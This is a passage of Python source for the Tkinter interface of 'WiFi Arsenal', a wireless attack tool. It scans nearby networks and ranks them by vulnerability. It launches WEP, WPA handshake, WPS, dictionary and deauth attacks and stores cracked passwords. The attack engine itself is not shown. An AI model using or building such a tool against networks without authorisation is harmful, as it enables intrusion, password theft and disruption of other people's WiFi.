        """Finalize attack result with metadata"""
        result.update({
            'attack_id': attack_id,
            'target_bssid': target.bssid,
            'target_essid': target.essid,
            'duration': time.time() - start_time,
            'timestamp': datetime.now().isoformat()
        })
        
        self.attack_results[attack_id] = result
        
        # Update statistics
        attack_type = result.get('method', 'Unknown')
        self.attack_statistics[f"{attack_type}_attempted"] += 1
        if result['success']:
            self.attack_statistics[f"{attack_type}_successful"] += 1
        
        return result

class WiFiArsenal:
    """Main WiFi Arsenal application with advanced GUI"""
    
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("WiFi Arsenal - Advanced WiFi Security Auditing Platform")
        self.root.geometry("1600x1000")
        self.root.configure(bg=ARSENAL_COLORS['bg_primary'])
        
        # Initialize components
        self.db = ArsenalDatabase()
        self.scanner = None
        self.attack_engine = None
        self.interface = None
        self.monitor_interface = None
        self.targets = []
        self.clients = []
        self.selected_target = None
        self.scanning = False
        
        # Style configuration
        self.setup_styles()
        
        # Create GUI
        self.create_header()
        self.create_navigation()
        self.create_status_bar()
        
        # Queue for thread communication
        self.queue = queue.Queue()
        self.root.after(100, self.process_queue)
        
        # Load initial data
        self.refresh_interfaces()
        
        # Check initial monitor mode status
        if self.interface and self._check_monitor_mode_status():
            self.monitor_btn.configure(text="Disable Monitor Mode")
            self.status_indicator.configure(fg=ARSENAL_COLORS['success'])
        
        # Bind events
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def setup_styles(self):
        """Setup advanced ttk styles"""
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure colors
        style.configure('Arsenal.TFrame', background=ARSENAL_COLORS['bg_secondary'])
        style.configure('Arsenal.TLabel', background=ARSENAL_COLORS['bg_secondary'], 
                       foreground=ARSENAL_COLORS['text_primary'], font=('Segoe UI', 10))
        style.configure('Arsenal.TButton', font=('Segoe UI', 10, 'bold'), padding=8)
        style.configure('Arsenal.TEntry', fieldbackground=ARSENAL_COLORS['bg_tertiary'],
                       foreground=ARSENAL_COLORS['text_primary'])
        style.configure('Arsenal.Treeview', background=ARSENAL_COLORS['bg_tertiary'],
                       foreground=ARSENAL_COLORS['text_primary'], font=('Consolas', 9))
        style.configure('Arsenal.Treeview.Heading', background=ARSENAL_COLORS['bg_secondary'],
                       foreground=ARSENAL_COLORS['text_primary'], font=('Segoe UI', 10, 'bold'))
        
        # Button styles
        style.map('Success.TButton', background=[('active', ARSENAL_COLORS['success'])])
        style.map('Danger.TButton', background=[('active', ARSENAL_COLORS['warning'])])
        style.map('Info.TButton', background=[('active', ARSENAL_COLORS['info'])])
    
    def create_header(self):
        """Create advanced header with branding"""
        header_frame = tk.Frame(self.root, bg=ARSENAL_COLORS['bg_secondary'], height=100)
        header_frame.pack(fill=tk.X, padx=0, pady=0)
        header_frame.pack_propagate(False)
        
        # Logo and title
        title_frame = tk.Frame(header_frame, bg=ARSENAL_COLORS['bg_secondary'])
        title_frame.pack(side=tk.LEFT, fill=tk.Y, padx=30, pady=20)
        
        # Main title
        title_label = tk.Label(title_frame, text="WiFi ARSENAL", 
                              font=('Orbitron', 28, 'bold'),
                              fg=ARSENAL_COLORS['accent_primary'], 
                              bg=ARSENAL_COLORS['bg_secondary'])
        title_label.pack(anchor=tk.W)
        
        subtitle_label = tk.Label(title_frame, text="Advanced WiFi Security Auditing Platform", 
                                 font=('Segoe UI', 12),
                                 fg=ARSENAL_COLORS['text_secondary'], 
                                 bg=ARSENAL_COLORS['bg_secondary'])
        subtitle_label.pack(anchor=tk.W)
        
        dev_label = tk.Label(title_frame, text="Developed by 0x0806", 
                            font=('Segoe UI', 10, 'italic'),
                            fg=ARSENAL_COLORS['accent_secondary'], 
                            bg=ARSENAL_COLORS['bg_secondary'])
        dev_label.pack(anchor=tk.W)
        
        # Interface controls
        controls_frame = tk.Frame(header_frame, bg=ARSENAL_COLORS['bg_secondary'])
        controls_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=30, pady=20)
        
        # Interface selection
        interface_label = tk.Label(controls_frame, text="Network Interface:", 
                                  font=('Segoe UI', 11, 'bold'),
                                  fg=ARSENAL_COLORS['text_primary'], 
                                  bg=ARSENAL_COLORS['bg_secondary'])
        interface_label.pack(anchor=tk.E)
        
        self.interface_var = tk.StringVar()
        self.interface_combo = ttk.Combobox(controls_frame, textvariable=self.interface_var,
                                          width=20, state='readonly')
        self.interface_combo.pack(anchor=tk.E, pady=(5, 10))
        self.interface_combo.bind('<<ComboboxSelected>>', self.on_interface_selected)
        
        # Monitor mode toggle
        self.monitor_btn = ttk.Button(controls_frame, text="Enable Monitor Mode", 
                                     command=self.toggle_monitor_mode)
        self.monitor_btn.pack(anchor=tk.E, pady=2)
        
        # Status indicator
        self.status_indicator = tk.Label(controls_frame, text="●", 
                                        font=('Arial', 20),
                                        fg=ARSENAL_COLORS['warning'], 
                                        bg=ARSENAL_COLORS['bg_secondary'])
        self.status_indicator.pack(anchor=tk.E, pady=5)
    
    def create_navigation(self):
        """Create navigation tabs"""
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=20, pady=(0, 20))
        
        # Scanner Tab
        self.scanner_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.scanner_frame, text="🔍 Network Scanner")
        self.create_scanner_tab()
        
        # Attack Center Tab
        self.attack_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.attack_frame, text="⚔️ Attack Center")
        self.create_attack_tab()
        
        # Results Tab
        self.results_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.results_frame, text="📊 Results")
        self.create_results_tab()
        
        # Database Tab
        self.database_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.database_frame, text="🗄️ Database")
        self.create_database_tab()
    
    def create_scanner_tab(self):
        """Create scanner interface"""
        # Control panel
        control_panel = tk.Frame(self.scanner_frame, bg=ARSENAL_COLORS['bg_tertiary'], height=120)
        control_panel.pack(fill=tk.X, padx=10, pady=10)
        control_panel.pack_propagate(False)
        
        # Scan controls
        scan_controls = tk.Frame(control_panel, bg=ARSENAL_COLORS['bg_tertiary'])
        scan_controls.pack(side=tk.LEFT, fill=tk.Y, padx=20, pady=10)
        
        tk.Label(scan_controls, text="Scan Controls", font=('Segoe UI', 12, 'bold'),
                fg=ARSENAL_COLORS['text_primary'], bg=ARSENAL_COLORS['bg_tertiary']).pack()
        
        self.scan_btn = ttk.Button(scan_controls, text="▶️ Start Scan", 
                                  command=self.toggle_scan)
        self.scan_btn.pack(pady=5)
        
        # Scan options
        options_frame = tk.Frame(control_panel, bg=ARSENAL_COLORS['bg_tertiary'])
        options_frame.pack(side=tk.LEFT, fill=tk.Y, padx=20, pady=10)
        
        tk.Label(options_frame, text="Scan Options", font=('Segoe UI', 12, 'bold'),
                fg=ARSENAL_COLORS['text_primary'], bg=ARSENAL_COLORS['bg_tertiary']).pack()
        
        # Channel selection
        channel_frame = tk.Frame(options_frame, bg=ARSENAL_COLORS['bg_tertiary'])
        channel_frame.pack(fill=tk.X, pady=2)
        
        tk.Label(channel_frame, text="Channel:", 
                fg=ARSENAL_COLORS['text_secondary'], bg=ARSENAL_COLORS['bg_tertiary']).pack(side=tk.LEFT)
        
        self.channel_var = tk.StringVar(value="All")
        channel_combo = ttk.Combobox(channel_frame, textvariable=self.channel_var, width=8)
        channel_combo['values'] = ['All'] + [str(i) for i in range(1, 15)] + [str(i) for i in range(36, 166, 4)]
        channel_combo.pack(side=tk.RIGHT)
        
        # Statistics
        stats_frame = tk.Frame(control_panel, bg=ARSENAL_COLORS['bg_tertiary'])
        stats_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=20, pady=10)
        
        tk.Label(stats_frame, text="Statistics", font=('Segoe UI', 12, 'bold'),
                fg=ARSENAL_COLORS['text_primary'], bg=ARSENAL_COLORS['bg_tertiary']).pack()
        
        self.stats_labels = {}
        for stat in ['Networks', 'Clients', 'Time']:
            frame = tk.Frame(stats_frame, bg=ARSENAL_COLORS['bg_tertiary'])
            frame.pack(fill=tk.X)
            
            tk.Label(frame, text=f"{stat}:", 
                    fg=ARSENAL_COLORS['text_secondary'], bg=ARSENAL_COLORS['bg_tertiary']).pack(side=tk.LEFT)
            
            self.stats_labels[stat.lower()] = tk.Label(frame, text="0", 
                                                      fg=ARSENAL_COLORS['accent_secondary'], 
                                                      bg=ARSENAL_COLORS['bg_tertiary'])
            self.stats_labels[stat.lower()].pack(side=tk.RIGHT)
        
        # Networks table
        table_frame = tk.Frame(self.scanner_frame, bg=ARSENAL_COLORS['bg_secondary'])
        table_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create treeview
        columns = ('ESSID', 'BSSID', 'CH', 'Power', 'Encryption', 'WPS', 'Vendor', 'Clients', 'Risk')
        
        self.networks_tree = ttk.Treeview(table_frame, columns=columns, show='headings', height=20)
        
        # Configure columns
        column_widths = {
            'ESSID': 200, 'BSSID': 140, 'CH': 40, 'Power': 80, 'Encryption': 120,
            'WPS': 50, 'Vendor': 100, 'Clients': 60, 'Risk': 100
        }
        
        for col in columns:
            self.networks_tree.heading(col, text=col)
            self.networks_tree.column(col, width=column_widths.get(col, 100))
        
        # Scrollbars
        v_scroll = ttk.Scrollbar(table_frame, orient=tk.VERTICAL, command=self.networks_tree.yview)
        self.networks_tree.configure(yscrollcommand=v_scroll.set)
        
        # Pack elements
        self.networks_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        v_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Bind events
        self.networks_tree.bind('<<TreeviewSelect>>', self.on_network_selected)
        self.networks_tree.bind('<Double-1>', self.on_network_double_click)
    
    def create_attack_tab(self):
        """Create attack center interface"""
        # Target info panel
        target_info_frame = tk.LabelFrame(self.attack_frame, text="🎯 Target Information",
                                         font=('Segoe UI', 12, 'bold'),
                                         fg=ARSENAL_COLORS['text_primary'],
                                         bg=ARSENAL_COLORS['bg_secondary'])
        target_info_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.target_info_text = scrolledtext.ScrolledText(target_info_frame, height=8,
                                                         bg=ARSENAL_COLORS['bg_tertiary'],
                                                         fg=ARSENAL_COLORS['text_primary'],
                                                         font=('Consolas', 10))
        self.target_info_text.pack(fill=tk.X, padx=10, pady=10)
        
        # Attack selection panel
        attack_panel = tk.LabelFrame(self.attack_frame, text="⚔️ Attack Modules",
                                    font=('Segoe UI', 12, 'bold'),
                                    fg=ARSENAL_COLORS['text_primary'],
                                    bg=ARSENAL_COLORS['bg_secondary'])
        attack_panel.pack(fill=tk.X, padx=10, pady=10)
        
        # Attack buttons
        button_frame = tk.Frame(attack_panel, bg=ARSENAL_COLORS['bg_secondary'])
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.attack_buttons = {}
        
        attacks = [
            ('WEP Attack', 'wep', '🔓'),
            ('WPA Handshake', 'handshake', '🤝'),
            ('WPS Attack', 'wps', '📱'),
            ('Dictionary Attack', 'dictionary', '📚'),
            ('Deauth Attack', 'deauth', '💥')
        ]
        
        for i, (name, key, icon) in enumerate(attacks):
            btn = ttk.Button(button_frame, text=f"{icon} {name}", 
                           command=lambda k=key: self.launch_attack(k),
                           state=tk.DISABLED)
            btn.grid(row=i//3, column=i%3, padx=5, pady=5, sticky='ew')
            self.attack_buttons[key] = btn
        
        # Configure grid weights
        for i in range(3):
            button_frame.columnconfigure(i, weight=1)
        
        # Progress panel
        progress_panel = tk.LabelFrame(self.attack_frame, text="📈 Attack Progress",
                                      font=('Segoe UI', 12, 'bold'),
                                      fg=ARSENAL_COLORS['text_primary'],
                                      bg=ARSENAL_COLORS['bg_secondary'])
        progress_panel.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Progress bar
        self.attack_progress = ttk.Progressbar(progress_panel, mode='indeterminate')
        self.attack_progress.pack(fill=tk.X, padx=10, pady=10)
        
        # Attack log
        self.attack_log = scrolledtext.ScrolledText(progress_panel, height=15,
                                                   bg=ARSENAL_COLORS['bg_tertiary'],
                                                   fg=ARSENAL_COLORS['text_primary'],
                                                   font=('Consolas', 9))
        self.attack_log.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    def create_results_tab(self):
        """Create results tab"""
        # Results summary
        summary_frame = tk.LabelFrame(self.results_frame, text="📊 Attack Summary",
                                     font=('Segoe UI', 12, 'bold'),
                                     fg=ARSENAL_COLORS['text_primary'],
                                     bg=ARSENAL_COLORS['bg_secondary'])
        summary_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.results_summary = tk.Text(summary_frame, height=6,
                                      bg=ARSENAL_COLORS['bg_tertiary'],
                                      fg=ARSENAL_COLORS['text_primary'],
                                      font=('Consolas', 10))
        self.results_summary.pack(fill=tk.X, padx=10, pady=10)
        
        # Results table
        results_table_frame = tk.LabelFrame(self.results_frame, text="🗂️ Attack History",
                                          font=('Segoe UI', 12, 'bold'),
                                          fg=ARSENAL_COLORS['text_primary'],
                                          bg=ARSENAL_COLORS['bg_secondary'])
        results_table_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create results treeview
        results_columns = ('Time', 'Target', 'Attack', 'Status', 'Result')
        
        self.results_tree = ttk.Treeview(results_table_frame, columns=results_columns, show='headings', height=15)
        
        for col in results_columns:
            self.results_tree.heading(col, text=col)
            self.results_tree.column(col, width=150)
        
        # Scrollbar for results
        results_scroll = ttk.Scrollbar(results_table_frame, orient=tk.VERTICAL, command=self.results_tree.yview)
        self.results_tree.configure(yscrollcommand=results_scroll.set)
        
        self.results_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        results_scroll.pack(side=tk.RIGHT, fill=tk.Y, pady=10)
        
        # Refresh button
        refresh_btn = ttk.Button(results_table_frame, text="🔄 Refresh Results", 
                               command=self.refresh_results)
        refresh_btn.pack(pady=5)
    
    def create_database_tab(self):
        """Create database management tab"""
        # Database info
        db_info_frame = tk.LabelFrame(self.database_frame, text="🗄️ Database Information",
                                     font=('Segoe UI', 12, 'bold'),
                                     fg=ARSENAL_COLORS['text_primary'],
                                     bg=ARSENAL_COLORS['bg_secondary'])
        db_info_frame.pack(fill=tk.X, padx=10, pady=10)
        
        self.db_info_text = tk.Text(db_info_frame, height=6,
                                   bg=ARSENAL_COLORS['bg_tertiary'],
                                   fg=ARSENAL_COLORS['text_primary'],
                                   font=('Consolas', 10))
        self.db_info_text.pack(fill=tk.X, padx=10, pady=10)
        
        # Database controls
        db_controls_frame = tk.Frame(self.database_frame, bg=ARSENAL_COLORS['bg_secondary'])
        db_controls_frame.pack(fill=tk.X, padx=10, pady=10)
        
        export_btn = ttk.Button(db_controls_frame, text="📤 Export Data", 
                               command=self.export_database)
        export_btn.pack(side=tk.LEFT, padx=5)
        
        import_btn = ttk.Button(db_controls_frame, text="📥 Import Data", 
                               command=self.import_database)
        import_btn.pack(side=tk.LEFT, padx=5)
        
        clear_btn = ttk.Button(db_controls_frame, text="🗑️ Clear Database", 
                              command=self.clear_database)
        clear_btn.pack(side=tk.LEFT, padx=5)
        
        # Update database info
        self.update_database_info()
    
    def create_status_bar(self):
        """Create status bar"""
        self.status_bar = tk.Frame(self.root, bg=ARSENAL_COLORS['bg_tertiary'], height=30)
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM)
        self.status_bar.pack_propagate(False)
        
        # Status text
        self.status_text = tk.Label(self.status_bar, text="🚀 WiFi Arsenal Ready", 
                                   bg=ARSENAL_COLORS['bg_tertiary'], 
                                   fg=ARSENAL_COLORS['text_primary'],
                                   font=('Segoe UI', 10))
        self.status_text.pack(side=tk.LEFT, padx=10, pady=5)
        
        # Version info
        version_label = tk.Label(self.status_bar, text="v2.0.0", 
                                bg=ARSENAL_COLORS['bg_tertiary'], 
                                fg=ARSENAL_COLORS['text_secondary'],
                                font=('Segoe UI', 9))
        version_label.pack(side=tk.RIGHT, padx=10, pady=5)
    
    def refresh_interfaces(self):
        """Refresh available network interfaces"""
        try:
            interfaces = ArsenalNetworkInterface.get_interfaces()
            interface_names = [iface['name'] for iface in interfaces]
            
            self.interface_combo['values'] = interface_names
            if interface_names:
                self.interface_var.set(interface_names[0])
                self.interface = interface_names[0]
        except Exception as e:
            messagebox.showerror("Error", f"Failed to get interfaces: {e}")
    
    def on_interface_selected(self, event=None):
        """Handle interface selection"""
        self.interface = self.interface_var.get()
        self.update_status(f"Selected interface: {self.interface}")
        
        if self.interface:
            self.attack_engine = ArsenalAttackEngine(self.interface)
            # Check if interface is already in monitor mode
            if self._check_monitor_mode_status():
                self.monitor_btn.configure(text="Disable Monitor Mode")
                self.status_indicator.configure(fg=ARSENAL_COLORS['success'])
            else:
                self.monitor_btn.configure(text="Enable Monitor Mode")
                self.status_indicator.configure(fg=ARSENAL_COLORS['warning'])
    
    def toggle_monitor_mode(self):
        """Toggle monitor mode with proper state detection"""
        if not self.interface:
            messagebox.showerror("Error", "Please select an interface first")
            return
        
        # Check current monitor mode status
        current_monitor_status = self._check_monitor_mode_status()
        
        if not current_monitor_status:
            # Enable monitor mode
            self.update_status("Enabling monitor mode...")
            try:
                success, result = ArsenalNetworkInterface.enable_monitor_mode(self.interface)
                
                if success:
                    self.monitor_interface = result
                    # Update the interface to use monitor interface for attacks
                    if self.attack_engine:
                        self.attack_engine.interface = result
                    self.monitor_btn.configure(text="Disable Monitor Mode")
                    self.status_indicator.configure(fg=ARSENAL_COLORS['success'])
                    self.update_status(f"Monitor mode enabled: {self.monitor_interface}")
                    messagebox.showinfo("Success", f"Monitor mode enabled: {self.monitor_interface}")
                else:
                    messagebox.showerror("Error", f"Failed to enable monitor mode: {result}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to enable monitor mode: {e}")
        else:
            # Disable monitor mode
            try:
                interface_to_disable = self.monitor_interface or self.interface
                success = ArsenalNetworkInterface.disable_monitor_mode(interface_to_disable)
                
                if success:
                    self.monitor_interface = None
                    # Reset attack engine to original interface
                    if self.attack_engine:
                        self.attack_engine.interface = self.interface
                    self.monitor_btn.configure(text="Enable Monitor Mode")
                    self.status_indicator.configure(fg=ARSENAL_COLORS['warning'])
                    self.update_status("Monitor mode disabled")
                    messagebox.showinfo("Success", "Monitor mode disabled")
                else:
                    messagebox.showerror("Error", "Failed to disable monitor mode")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to disable monitor mode: {e}")
    
    def _check_monitor_mode_status(self):
        """Check if interface is currently in monitor mode"""
        try:
            # Check if current interface or monitor interface is in monitor mode
            interfaces_to_check = [self.interface]
            if self.monitor_interface:
                interfaces_to_check.append(self.monitor_interface)
            
            result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=10)
            
            for interface in interfaces_to_check:
                if interface in result.stdout:
                    # Look for monitor mode indication in iwconfig output
                    lines = result.stdout.split('\n')
                    for i, line in enumerate(lines):
                        if interface in line and 'IEEE 802.11' in line:
                            # Check the next few lines for mode information
                            for j in range(i, min(i+3, len(lines))):
                                if 'Mode:Monitor' in lines[j]:
                                    self.monitor_interface = interface
                                    return True
            
            return False
        except Exception:
            return False
    
    def toggle_scan(self):
        """Toggle WiFi scanning"""
        if not self.monitor_interface:
            messagebox.showerror("Error", "Monitor mode must be enabled first")
            return
        
        if not self.scanning:
            # Start scanning
            self.scanner = ArsenalScanner(self.monitor_interface, self.update_scan_results)
            
            channel = None if self.channel_var.get() == "All" else int(self.channel_var.get())
            
            try:
                if self.scanner.start_scan(channel):
                    self.scanning = True
                    self.scan_btn.configure(text="⏹️ Stop Scan")
                    self.update_status("Scanning started...")
                else:
                    messagebox.showerror("Error", "Failed to start scanning")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to start scanning: {e}")
        else:
            # Stop scanning
            if self.scanner:
                self.scanner.stop_scan()
            self.scanning = False
            self.scan_btn.configure(text="▶️ Start Scan")
            self.update_status("Scanning stopped")
    
    def update_scan_results(self, targets, clients):
        """Update scan results"""
        self.queue.put(('scan_results', {'targets': targets, 'clients': clients}))
    
    def process_queue(self):
        """Process queue messages"""
        try:
            while True:
                message_type, data = self.queue.get_nowait()
                
                if message_type == 'scan_results':
                    self._update_networks_table(data['targets'], data['clients'])
                elif message_type == 'attack_progress':
                    self._update_attack_progress(data)
                elif message_type == 'attack_complete':
                    self._handle_attack_complete(data)
                
        except queue.Empty:
            pass
        finally:
            self.root.after(100, self.process_queue)
    
    def _update_networks_table(self, targets, clients):
        """Update networks table"""
        # Clear existing items
        for item in self.networks_tree.get_children():
            self.networks_tree.delete(item)
        
        # Sort by vulnerability score
        targets.sort(key=lambda x: x.vulnerability_score, reverse=True)
        
        # Update table
        for target in targets:
            risk_level = target.get_risk_level()
            
            values = (
                target.essid,
                target.bssid,
                target.channel,
                f"{target.power} dBm",
                target.encryption,
                "Yes" if target.wps else "No",
                target.vendor,
                len(target.clients),
                f"{target.vulnerability_score}/100 ({risk_level})"
            )
            
            self.networks_tree.insert('', 'end', values=values)
        
        # Update statistics
        self.targets = targets
        self.clients = clients
        self._update_scan_statistics()
        
        # Save to database
        for target in targets:
            self.db.save_network(target.to_dict())
    
    def _update_scan_statistics(self):
        """Update scan statistics"""
        if hasattr(self, 'stats_labels'):
            self.stats_labels['networks'].configure(text=str(len(self.targets)))
            self.stats_labels['clients'].configure(text=str(len(self.clients)))
            
            if self.scanner and self.scanner.scan_start_time:
                elapsed = int(time.time() - self.scanner.scan_start_time)
                self.stats_labels['time'].configure(text=f"{elapsed}s")
    
    def on_network_selected(self, event):
        """Handle network selection"""
        selection = self.networks_tree.selection()
        if not selection:
            return
        
        item = self.networks_tree.item(selection[0])
        values = item['values']
        
        # Find target by BSSID
        bssid = values[1]
        self.selected_target = None
        
        for target in self.targets:
            if target.bssid == bssid:
                self.selected_target = target
                break
        
        if self.selected_target:
            self._update_target_info()
            self._enable_attack_buttons()
    
    def on_network_double_click(self, event):
        """Handle network double-click"""
        self.on_network_selected(event)
        if self.selected_target:
            # Switch to attack tab
            self.notebook.select(1)
    
    def _update_target_info(self):
        """Update target information display"""
        if not self.selected_target:
            return
        
        info = f"""
🎯 TARGET INFORMATION
═══════════════════════════════════════════════════════════════

Network Name (ESSID): {self.selected_target.essid}
MAC Address (BSSID):  {self.selected_target.bssid}
Channel:              {self.selected_target.channel}
Frequency:            {self.selected_target.frequency} MHz
Signal Strength:      {self.selected_target.power} dBm
Encryption:           {self.selected_target.encryption}
WPS Enabled:          {'Yes' if self.selected_target.wps else 'No'}
Vendor:               {self.selected_target.vendor}
Connected Clients:    {len(self.selected_target.clients)}

🔒 VULNERABILITY ASSESSMENT
═══════════════════════════════════════════════════════════════

Vulnerability Score:  {self.selected_target.vulnerability_score}/100
Risk Level:           {self.selected_target.get_risk_level()}

📈 ATTACK RECOMMENDATIONS
═══════════════════════════════════════════════════════════════
"""
        
        # Add attack recommendations
        if 'WEP' in self.selected_target.encryption:
            info += "\n🔓 WEP Attack: HIGHLY RECOMMENDED (WEP is critically vulnerable)"
        if 'WPA' in self.selected_target.encryption:
            info += "\n🤝 Handshake Capture: Recommended for dictionary attacks"
        if self.selected_target.wps:
            info += "\n📱 WPS Attack: Recommended (WPS PIN vulnerabilities)"
        if len(self.selected_target.clients) > 0:
            info += "\n💥 Deauth Attack: Effective (clients present for handshake capture)"
        
        info += "\n\n👥 CLIENT DETAILS\n═══════════════════════════════════════════════════════════════"
        
        if self.selected_target.clients:
            for i, client in enumerate(self.selected_target.clients, 1):
                info += f"\nClient {i}: {client['mac']} (Power: {client['power']} dBm)"
        else:
            info += "\nNo clients detected"
        
        self.target_info_text.delete(1.0, tk.END)
        self.target_info_text.insert(1.0, info)
    
    def _enable_attack_buttons(self):
        """Enable appropriate attack buttons"""
        if not self.selected_target:
            return
        
        # Reset all buttons
        for btn in self.attack_buttons.values():
            btn.configure(state=tk.DISABLED)
        
        # Enable based on target capabilities
        if 'WEP' in self.selected_target.encryption:
            self.attack_buttons['wep'].configure(state=tk.NORMAL)
        
        if 'WPA' in self.selected_target.encryption:
            self.attack_buttons['handshake'].configure(state=tk.NORMAL)
            self.attack_buttons['dictionary'].configure(state=tk.NORMAL)
        
        if self.selected_target.wps:
            self.attack_buttons['wps'].configure(state=tk.NORMAL)
        
        # Always enable deauth
        self.attack_buttons['deauth'].configure(state=tk.NORMAL)
    
    def launch_attack(self, attack_type):
        """Launch specified attack"""
        if not self.selected_target or not self.attack_engine:
            messagebox.showerror("Error", "No target selected or attack engine not initialized")
            return
        
        # Switch to attack tab
        self.notebook.select(1)
        
        # Clear previous logs
        self.attack_log.delete(1.0, tk.END)
        
        # Start progress bar
        self.attack_progress.start()
        
        # Log attack start
        self.log_attack(f"🚀 Starting {attack_type.upper()} attack on {self.selected_target.essid}")
        self.log_attack(f"Target: {self.selected_target.bssid}")
        
        # Launch attack in separate thread
        threading.Thread(target=self._attack_worker, args=(attack_type,), daemon=True).start()
    
    def _attack_worker(self, attack_type):
        """Attack worker thread"""
        try:
            result = None
            
            if attack_type == 'wep':
                result = self.attack_engine.attack_wep(
                    self.selected_target, 
                    lambda msg: self.queue.put(('attack_progress', msg))
                )
            elif attack_type == 'handshake':
                result = self.attack_engine.attack_wpa_handshake(
                    self.selected_target,
                    lambda msg: self.queue.put(('attack_progress', msg))
                )
            elif attack_type == 'wps':
                result = self.attack_engine.attack_wps_advanced(
                    self.selected_target,
                    lambda msg: self.queue.put(('attack_progress', msg))
                )
            elif attack_type == 'dictionary':
                # Need to select wordlist
                wordlist = filedialog.askopenfilename(
                    title="Select Wordlist",
                    filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
                )
                if wordlist:
                    # Find handshake file (user needs to have captured one first)
                    handshake_file = filedialog.askopenfilename(
                        title="Select Handshake File",
                        filetypes=[("Capture files", "*.cap"), ("All files", "*.*")]
                    )
                    if handshake_file:
                        result = self.attack_engine.crack_handshake_dictionary(
                            handshake_file, wordlist, self.selected_target,
                            lambda msg: self.queue.put(('attack_progress', msg))
                        )
                    else:
                        result = {'success': False, 'error': 'No handshake file selected'}
                else:
                    result = {'success': False, 'error': 'No wordlist selected'}
            elif attack_type == 'deauth':
                result = self.attack_engine.attack_deauth(
                    self.selected_target,
                    lambda msg: self.queue.put(('attack_progress', msg))
                )
            
            self.queue.put(('attack_complete', result))
            
        except Exception as e:
            self.queue.put(('attack_complete', {'success': False, 'error': str(e)}))
    
    def _update_attack_progress(self, message):
        """Update attack progress"""
        self.log_attack(message)
    
    def _handle_attack_complete(self, result):
        """Handle attack completion"""
        self.attack_progress.stop()
        
        if result and result['success']:
            self.log_attack("✅ ATTACK SUCCESSFUL!")
            
            if 'key' in result:
                self.log_attack(f"🔑 Password: {result['key']}")
            
            if 'pin' in result:
                self.log_attack(f"📱 WPS PIN: {result['pin']}")
            
            if 'method' in result:
                self.log_attack(f"🎯 Method: {result['method']}")
            
            # Save to database
            self.db.save_attack_result({
                'target_bssid': self.selected_target.bssid,
                'target_essid': self.selected_target.essid,
                'attack_type': result.get('method', 'Unknown'),
                'success': True,
                'password': result.get('key', ''),
                'pin': result.get('pin', ''),
                'duration': result.get('duration', 0)
            })
            
            messagebox.showinfo("Attack Successful!", 
                               f"Attack completed successfully!\n"
                               f"Password: {result.get('key', 'N/A')}")
        else:
            error_msg = result.get('error', 'Unknown error') if result else 'Attack failed'
            self.log_attack(f"❌ ATTACK FAILED: {error_msg}")
            messagebox.showwarning("Attack Failed", f"Attack was unsuccessful:\n{error_msg}")
        
        # Refresh results
        self.refresh_results()
    
    def log_attack(self, message):
        """Log attack message"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        self.attack_log.insert(tk.END, log_entry)
        self.attack_log.see(tk.END)
        self.attack_log.update()
    
    def refresh_results(self):
        """Refresh results display"""
        # Clear results tree
        for item in self.results_tree.get_children():
            self.results_tree.delete(item)
        
        # Get attack history from database
        attacks = self.db.get_attack_history()
        
        # Update results tree
        for attack in attacks:
            timestamp = attack[1] if len(attack) > 1 else 'N/A'
            target = attack[3] if len(attack) > 3 else 'N/A'
            attack_type = attack[4] if len(attack) > 4 else 'N/A'
            success = attack[7] if len(attack) > 7 else False
            password = attack[8] if len(attack) > 8 else ''
            
            status = "SUCCESS" if success else "FAILED"
            result = password if password else "N/A"
            
            self.results_tree.insert('', 'end', values=(
                timestamp[:19] if timestamp != 'N/A' else 'N/A',
                target,
                attack_type,
                status,
                result
            ))
        
        # Update summary
        total_attacks = len(attacks)
        successful_attacks = len([a for a in attacks if len(a) > 7 and a[7]])
        success_rate = (successful_attacks / total_attacks * 100) if total_attacks > 0 else 0
        
        summary = f"""
📊 ATTACK SUMMARY
═══════════════════════════════════════════════════════════════

Total Attacks:        {total_attacks}
Successful Attacks:   {successful_attacks}
Success Rate:         {success_rate:.1f}%
Networks Discovered:  {len(self.targets)}
Passwords Cracked:    {len([a for a in attacks if len(a) > 8 and a[8]])}

Last Updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        self.results_summary.delete(1.0, tk.END)
        self.results_summary.insert(1.0, summary)
    
    def update_database_info(self):
        """Update database information display"""
        networks = self.db.get_all_networks()
        attacks = self.db.get_attack_history()
        
        db_info = f"""
🗄️ DATABASE INFORMATION
═══════════════════════════════════════════════════════════════

Database File:        {self.db.db_path}
File Size:           {os.path.getsize(self.db.db_path) if os.path.exists(self.db.db_path) else 0} bytes
Networks Stored:      {len(networks)}
Attack Records:       {len(attacks)}
Created:             {datetime.fromtimestamp(os.path.getctime(self.db.db_path)).strftime('%Y-%m-%d %H:%M:%S') if os.path.exists(self.db.db_path) else 'N/A'}
Last Modified:       {datetime.fromtimestamp(os.path.getmtime(self.db.db_path)).strftime('%Y-%m-%d %H:%M:%S') if os.path.exists(self.db.db_path) else 'N/A'}
"""
        
        self.db_info_text.delete(1.0, tk.END)
